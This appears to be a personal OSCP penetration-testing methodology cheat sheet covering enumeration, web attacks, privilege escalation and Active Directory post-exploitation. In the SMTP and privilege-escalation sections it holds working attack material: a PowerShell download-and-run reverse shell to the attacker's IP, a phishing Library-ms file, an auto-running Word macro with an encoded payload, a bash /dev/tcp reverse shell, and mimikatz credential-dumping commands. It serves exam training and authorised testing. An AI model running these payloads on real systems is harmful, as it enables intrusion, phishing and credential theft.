

  



# OSCP Methodology 

Use this manual: [https://book.hacktricks.xyz](#https://book.hacktricks.xyz)

Reverse shell cheatsheet: [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](#https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

Reverse shell generator: [https://www.revshells.com/](#https://www.revshells.com/)


## Initial Recon 

OS Check \(NMap\):

```
 nmap -O {IP} 
 ```


### ENUM 

Start deep enum process with AutoRecon\.py \(https://github\.com/Tib3rius/AutoRecon\.git\):

```
 python3 autorecon.py -o {output directory} {IP} -vv 
 ```


Enumerate again every port \(NMap\):

```
 nmap -p- {IP} 
 ```


Enumerate every service \(NMap\):

```
 nmap -p {service port} {IP} 
 ```


### VULN & EXPLOIT CHECK 

For every service found, we have to check the version on:
\- ExploitDB
\- SearchSploit
\- Rapid7

For every port with unidentified service we have to check “**port number \+ exploit**”  and check EVERY exploit for working\.
When an exploit is in Python2, we either:
\- repair it easily
\- get an existing updated version from issues or other branches in GitHub/GitLab etc\.

If an exploit gives us patched message or doesn't work, WE HAVE TO CHECK ANOTHER ONE, SAME SERVICE TO MAKE SURE THAT SERVICE IS UNEXPLOITABLE\.

## SERVICE ENUM  

We have to enumerate every service and gather as much information as possible\.

\!For file transfer:
Linux:
\- curl
\- scp

Windows:
\- curl
\- certutil
\- scp


### TCP 

We will find the service report from AutoRecon\.py, name Full TCP Scan\.

#### FTP 

\- find the version, maybe it's a vulnerable one
\- check if we are allowed anonymous login \(user: anonymous\)

```
 sudo nmap -sV -p21 -sC -A {IP} 
 ```

\- get the certificate, if any

```
 openssl s_client -connect crossfit.htb:21 -starttls ftp 
 ```


We can try brute\-force with Hydra \(any username that we may find\):

```
 hydra -l {username} -P {wordlist} {IP} ftp 
 ```


More possible exploits here: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)


#### SSH 

\- check vulnerable version, some may allow username enumerationtime\-based
\- audit the entire service using SSH\-audit \([https://github.com/jtesta/ssh-audit](#https://github.com/jtesta/ssh-audit)
\)

We can try brute\-force with Hydra \(any username that we may find\):

```
 hydra -l {username} -P {wordlist} {IP} ftp 
 ```


More possible exploits here: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)


#### DNS 

\- try zone transfer

```
 dig axfr @<DNS_IP>
dig axfr @<DNS_IP> <DOMAIN> 
 ```

\- try reverse IP lookup

```
 dig -x {IP} @<DNS_IP> 
 ```

More exploits: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns)


#### HTTP 

We have to **Dirbust**and **Feroxbust**using good wordlists:
\- /usr/share/seclists/Discovery/Web\-Content/big\.txt
\- /usr/share/seclists/Discovery/Web\-Content/directory\-list\-2\.3\-medium\.txt
\- /usr/share/seclists/Discovery/Web\-Content/directory\-list\-2\.3\-big\.txt \(let it **run in background**while testing other stuff\)

Also we have to check:
\- always check server headers \(maybe there is a vulnerable server, maybe there is another thing interesting\)
\- intersting exntensions \(docx, pdf, txt, php, sql\)
\- we have to check recursive
\- check if git is present on the server
\- check page contents, maybe credentials or something helpful is already there
\- check comments
\- check cookies and session
\- **FUZZ**suspect endpoints; use wordlists from /usr/share/seclists/Fuzzing
-  try base64
-  try URL encoded

##### SQL injections 

\- check with quote “ ' ”
\- check the request in network tab for errors
\- check for time differences between **normal requests**and **ones that may have errors**

More on SQL injections:
\- [https://book.hacktricks.xyz/pentesting-web/sql-injection](#https://book.hacktricks.xyz/pentesting-web/sql-injection)

\- [https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](#https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)



##### SSRF 

\- if Windows, we can capture the Kerberos Ticket using Responder and SSRF
\- we can check for firwalls by checkinf if we get a request on more stranger ports \(open a HTTP server on our machine on 4444 and try to get a request\)

More on that here: [https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery](#https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)


It is also used to get inner services =\> we can request [http://127.0.0.1:21](#http://127.0.0.1:21)
and if the connection is refused, then the box does not have FTP running internal \(just an example\)\. Check this: [https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation](#https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation)


##### LFI & RFI 

\- we can try to include shells from our server
\[For LFI\] we can poison the access logs requiresting [http://url/malicious-payload](#http://url/malicious-payload)
then we can include the apache access log in order to execute the PHP payload that we included in it
Places for **access\.log**/var/log/apache/access\. log\.

\- see if there is an **upload functionality**to mix with LFI vulnerability

Check **firewall file on Linux**: /etc/ufw/user\.rules, help to get a port for the reverse shell\.

More on that here: [https://book.hacktricks.xyz/pentesting-web/file-inclusion](#https://book.hacktricks.xyz/pentesting-web/file-inclusion)


##### Upload Feature 

\- We can try to get the **Kerberos Ticket**with **Responder**by catching the **request used to upload**, and **changing the path of the file we want to upload to our responder server**
\- We can try uplading reverse shells

Bypass methods for upload protection: 
\- [https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass](#https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass)

\- [https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass](#https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass)


More on that here: [https://book.hacktricks.xyz/pentesting-web/file-upload](#https://book.hacktricks.xyz/pentesting-web/file-upload)


##### STUCK? 

\- Dirbust one more time, each directory found in particular
\- Dirbust by extensions \(ex\.: PHP\)
\- Try using POST params as GET

#### SMTP 

We can use **Evolution**as a **SMTP UI client**\.

\- Check the version, some exim versions might be VULNERABLE\.
\- Check for **username enumeration**

This might be a sign that we can trigger initial intrusion using a client\-side attack
We can create a **config\.Library\-ms**

```
 <?xml version="1.0" encoding="UTF-8"?>
<libraryDescription
xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://{Our IP}</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription> 
 ```


Then we can run to start hosting a WebDav server:

```
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root
/home/kali/webdav/ 
 ```

And inside we must create a shortcut that will download PowerCat and start a reverse shell \(note that we also have to start a server on port 8000 to host PowerCat\):

```
 powershell.exe -c "IEX(New-Object
System.Net.WebClient).DownloadString('http://{our
IP}:8000/powercat.ps1');
powercat -c {our IP} -p 4444 -e powershell" 
 ```


For Word Macros\. check this example:

```
 Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str +
"AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str +
"AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str +
"QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str +
"gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub 
 ```


For more check here: [https://github.com/glowbase/macro_reverse_shell](#https://github.com/glowbase/macro_reverse_shell)


We can send emails of the client side attacks using SWAKS:
[https://www.kali.org/tools/swaks/](#https://www.kali.org/tools/swaks/)

Example:

```
 swaks -t {to email} --from {from email} --attach {local file to
attach} --server {IP of SMTP server} --body {txt file with body
contents}
--header "Subject: Example" --suppress-data -ap 
 ```

\-\-suppress\-dataSummarizes the DATA portion of the SMTP transaction instead of
printing every line
\-apis for providing auth passwords

Check this methodology: [https://fareedfauzi.gitbook.io/oscp-playbook/services-enumeration/smtp](#https://fareedfauzi.gitbook.io/oscp-playbook/services-enumeration/smtp)


#### MSSQL 

Port \- 1433
To use: impacket\-mssqlclient
Check this RCE using impacket\-mssqlclient: [https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/](#https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/)

Also the official Kali documentation: [https://www.kali.org/tools/impacket-scripts/#impacket-mssqlclient](#https://www.kali.org/tools/impacket-scripts/#impacket-mssqlclient)


More documentation on: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)


**Very important: **When logging in with a Windows User, use **windows\-auth**flag in **impacket\-mssqlclient**

#### LDAP 

Port \- 389 or 636 \(for LDAPs \- secure\)
Use ldapsearchto enumerate:

```
 ldapsearch -x -b "dc=domain,dc=com" -H ldap://{IP} 
 ```


Also, do not forget to **grep**for:
\- DefaultPassword
\- Password
\- Pwd

More on it here: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)


### UDP 

\[ NMAP OVERVIEW \]

#### SNMP 

Before searching, it might be useful to update our MIB:

```
 sudo download-mibs
# This will use /etc/snmp-mibs-downloader to download files from those
config files. 
 ```
s

AutoRecon\.py will enumerate the service\.
Check out:
\- onesixtyone
\- snmpwalk

Enumerate the last command executed:

```
 snmpwalk -v 1 -c {community string} {IP}
NET-SNMP-EXTEND-MIB::nsExtendOutputFull 
 ```

Also check RCE with SNMP \(requires community string with write permissions\): [https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce)

Also check this out: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp](#https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)


### STUCK? 

**Things to consider**
\- Have you confirmed the service on the port manually and googled all the things \(the SSH string, the banner text, the source\)?
\- Is there a service that will allow you to enumerate something useful \(i\.e\. usernames\) but maybe doesn't make that obvious \(e\.g\. RID brute\-force through SMB with crackmapexec or lookupsid\.py\)?
\- Have you used the best wordlist possible for your tasks \(is there a better/bigger directory list? Is there a SecLists cred list for this service?\)
\- Have you fuzzed the directories you have found for a\) more directories, or b\) common filetypes \-x php,pl,sh,etc
\- Have you tried some manual testing \(MySQL, wireshark inspections\)
\- Have you collected all the hashes**and cracked them**?
\- Have you tried ALL COMBINATIONS of the username/passwords and not just the pairs given? Have you tried them across all services/apps?
\- Do the version numbers tell you anything about the host?
\- Have you tried bruteforce \(cewl, patator\)?
\- Can you think of a way to find more information: More credentials, more URLs, more files, more ports, more access?
\- Try usernames found with **capital letter**, all **letters capital**
\- Do you need to relax some of the terms used for searching? Instead of v2\.8 maybe we check for anything under 3\.
\- Do you need a break?

\- If reverse shell is not working, try transferring a msfvenom payload and executing it instead
\- If commands are not recognized, use their absolute path, for example **powershell not recongnized**=\> **C:\\Windows\\System32\\WindowsPowerShell\\v1\.0\\powershell\.exe**

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\- FROM [https://dev.to/hackin7/proving-grounds-tips-50ae](#https://dev.to/hackin7/proving-grounds-tips-50ae)

\- The firewall of the machines may be configured to prevent reverse shell connections to most ports except the application ports =\> Use application port on your attacking machine for reverse shell
\- **admin:admin**, **admin:password**, **guest:guest**, **backup:backup**, **\<username\>:\<username\>**, default credentials, reused credentials
\- Google exploits, not just searchsploit\. Found many exploits this way
\- If the **ftp**command doesn't work, try passivemode, or **pftp**\. Same thing for vice versa

## PRIVILEGE ESCALATION 

We have to pay attention to **files on the machine**, most of the time, this is how privilege escalation is done\.

### Linux 

Use:
\- linpeas
\- kernel exploit suggester

Check kernel manually:

```
 uname -a 
 ```

**\!Important**: If we don't have GCC to compille on the box, and we encounter errors when we try to execute the locally compiled exploit, we need to simulate the exploited environment, check this: [https://github.com/X0RW3LL/XenSpawn](#https://github.com/X0RW3LL/XenSpawn)
\.

Check files manually:

```
 find / -perm -04000 2>/dev/null 
 ```

\- Check /optdirectory
\- Check if /etc/passwdwritable
\- Check if /etc/shadowreadable/writable
\- Check group that we are in with idand see what permissions it gives to us \(for example, admhas access to read logs\)

Manually check:
\- SUID
\- SGID
\- Cronjobs \(crontab \-l\)
\- Check logs for cronjobs

```
 grep "CRON" /var/log/syslog 
 ```

\- Check insecure system components with getcap
\- Check processes with ps aux

Check capabilities:

```
 getcap -r / 2>/dev/null
# And search for everyone 
 ```


Check opened ports:

```
 netstat -tulpn
# Maybe we can interact with an internal opened port? 
 ```


#### Special Cases 

\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\- Services and Reboot Privs \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
If we have these SUDO capabilities \(sudo \-l\):

```
 User lowpriv may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff 
 ```

We may find writable services inside etc:

```
 find /etc -writable 2>/dev/null
./systemd/system/normal.service 
 ```


Then we may overwrite this service with one that executes a reverse shell from root, then **sudo reboot**\.
More on it here: [https://security.stackexchange.com/a/264911](#https://security.stackexchange.com/a/264911)


\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\- Custom SUIDs \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
If a strange binary is found as SUID, check it's system calls:

```
 ltrace {binary} # This will load the executable and print every system
call
# If any systemcall is not with absolute path, we can inject into
path:
export PATH=/tmp:$PATH
# and add to that path a reverse shell with the name of that binary
system call (called without absolute path)
echo 'bash -c "bash -i >& /dev/tcp/192.168.118.3/4444 0>&1"' >
/tmp/{binary}
chmod +x /tmp/{binary}
 
 ```

This may be vulnerable to path injection\.
More on that here: [https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469](#https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469)
and [https://medium.com/purplebox/linux-privilege-escalation-with-path-variable-suid-bit-6b9c492411de](#https://medium.com/purplebox/linux-privilege-escalation-with-path-variable-suid-bit-6b9c492411de)


\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\- Check if we are in a container \-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
\!Check if we are in a container:

```
 hostname
# If we get gibberish data like "f8e1a236869d", we are in a container
and we should escape it => see services that are on the machine and we
could exploit
# (other services maybe be run by machine itself, not container, and
we could gather info about those services from inside the container,
to gain RCE
# of them from outside) 
 ```


### Windows 

Use \(and read CAREFULLY the output\):
\- winpeas
\- PowerUp
\- SharpUp

Pay attention on privilegeges of the user:

```
 whoami /all
whoami /priv 
 ```

Check the group of the user, maybe we have backup operator

```
 whoami /group 
 ```

Check files using powershell:

```
 Get-ChildItem -Filter *.txt -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} |
Select Fullname 
 ```

Extensions to check:
\- sql
\- sqlite
\- db
\- txt
\- pdf
\- doc
\- docx
\- ps1
\- ini
\- kdbx \(See KeePass\)

**Important:**Check all files, maybe we have Windows\.oldto extract SAM\. Extract it with both **samdump2**and **impacket\-secretsdump**\.
Check this: [https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/#Extracting_the_Hashes_with_secretsdumppy_and_samdump2](#https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/#Extracting_the_Hashes_with_secretsdumppy_and_samdump2)


Check scheduled tasks manually
Check services manually
Check active sessions \(PowerView\):
\- NetWkstaUserEnum

```
 Get-NetLoggedon 
 ```

\- NetSessionEnum

```
 Get-NetSession 
 ```


\- Check opened ports:

```
 netstat -ano
# Maybe we can interact with an internal opened port 
 ```


Check information of the system with **systeminfo**:
Then we use build number and last patch to search for a possible exploit\.

Note, for cross compiling, mingw\-w64 calls:

```
 i686-w64-mingw32-gcc   - Win x32
x86_64-w64-mingw32-gcc - Win x64 
 ```



### STUCK? 

\- Recheck every line of output from Winpeas/Linpeas
\- Recheck files
\- Rerun Winpeas/Linpeas

\- If in AD, try SharpHound and analyze object ACL \- **Only Windows**
\- Search the build number for privilege escalation exploits \- **Only Windows**
\- Check kernel or build exploit and try them all from WinPeas \- **Only Windows**
\- Check Installed software in **Program Files**and **Program Files x86**, maybe it is a public exploit \- **Only Windows**
\- Check if there is a binary that **backups**or does a **job that may be a service or a scheduled job **and replace with a reverse shell \- **Only Windows**

\- Always check **GTFOBins**for SUIDs and SUDO capabilities \(No matter if it look not probable\) \- **Only Linux**
\- Always check kernel version and try all exploits \-**Only Linux**
\- Try already known passwordsto **sudo**or switch user \(**su**\) to root \- **Password Reusal**\- **Only Linux**

\!For some reason samdump2 failed here as the both the NT and LM are coming up as blank for all accounts\. T**his is exactly why we need to have multiple tools to accomplish a single task\. When one fails, we can try another\.**

## AD 

Check this cheatsheet: [https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md](#https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md)


### Post-Exploitation 

We will use **mimikatz**:

```
 privilege::debug # this will allow us to temper with LSASS
token::elevate # this will make us nt_authority 
 ```

Then we will extract using every method, beginning with:

```
 sekurlsa::logonpasswords
lsadump::sam 
 ```

Do not forget to check **cached credentials**\.
Als check out this: [https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49](#https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)

Make sure to extract all\.

Rerun winpeasas admin to extract possible interesting data\.

Use **SharpHound**and **BloodHound**to detect possible misconfigurations\.

Check **every file**, recheck **logs**, and **every user directory**\.

Make sure to check every **PSReadLine directory**for **Console history**, for **every user**\.

Make sure to check the **default password**\.

Try **Kerberoasting**and **AS\-Rep**using valid credentials \(**Impacket suite**\), or a valid sessions \(**Rubeus**\)\.

Also check this link: [https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1](#https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1)
\.

#### Good To Do 

If we have admin we may be able to do more from RDP, so we should enable RDP:
[https://cloudzy.com/blog/enable-rdp-cmd/](#https://cloudzy.com/blog/enable-rdp-cmd/)

[https://github.com/crazywifi/Enable-RDP-One-Liner-CMD](#https://github.com/crazywifi/Enable-RDP-One-Liner-CMD)


### Lateral Movement 

Try credentials using crackmapexec:

```
 proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u
Administrator # this will check domain users credentials
proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u
Administrator --local-auth # this will check local users credentials
 
 ```

Every possible **username**and **password**must be stored in a file to check for later use\.

If **valid credentials**are found, we should try **evil\-winrm**and **RDP**into the machine, even if we don't have local admin with those creds\.

Use **crackmapexec**and **smbclient**to surf the shares\.

Also check this link: [https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#b769](#https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#b769)


We can use bloodhound\-pythonto enumerate bloodhound without access to the machine, only having valid creds of an unprivileged user:

```
 bloodhound-python -d {domain name} -ns {dc-ip} -c All -u {user} -p
{password} 
 ```


### File Transfer 

We can transfer files from the machine by port forwarding SCP port 6000 to 22 kali \(from the Pivot Machine\):

```
 .\plink.exe -ssh -l kali -pw "password" -N -L
0.0.0.0:6000:127.0.0.1:22 {kali IP} 
 ```


If we don't have an interactive shell, we can use this to transfer using **scp**:
Then we can transfer the files from the attacked machine:

```
 echo "y" | .\scp.exe -P 6000 file kali@{pivot IP}:file # this is to
accespt the key
echo "password" | .\scp.exe -P 6000 file kali@{pivot IP}:file # the
actual transfer 
 ```


\!Always use **scp**from **putty**\(pscp\.exe\)\.

### STUCK? 

\-  Try **spraying the credentials**, maybe a password is reused by another user \(but **watch out for account lockouts**\)
\- Check for password reusal